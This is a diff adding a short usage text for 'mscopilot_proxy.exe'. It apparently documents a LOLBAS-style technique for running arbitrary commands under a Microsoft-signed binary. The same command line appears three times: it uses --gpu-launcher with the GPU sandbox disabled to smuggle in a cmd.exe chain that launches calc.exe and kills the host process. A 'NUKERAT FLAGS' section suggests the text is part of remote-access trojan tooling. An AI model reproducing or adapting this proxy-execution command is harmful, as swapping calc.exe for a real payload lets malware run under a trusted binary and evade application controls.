@@ -1,0 +1,16 @@
+ABOUT
+    Microsoft Copilot proxy launcher. LOLBAS documents executing a
+    process under a trusted Microsoft-signed binary.
+
+USAGE:
+    mscopilot_proxy.exe --no-startup-window --disable-gpu-sandbox --gpu-launcher="cmd.exe /c calc.exe && taskkill /f /im mscopilot.exe &&"
+
+EXAMPLES:
+    mscopilot_proxy.exe --no-startup-window --disable-gpu-sandbox --gpu-launcher="cmd.exe /c calc.exe && taskkill /f /im mscopilot.exe &&"
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    mscopilot_proxy.exe --no-startup-window --disable-gpu-sandbox --gpu-launcher="cmd.exe /c calc.exe && taskkill /f /im mscopilot.exe &&"
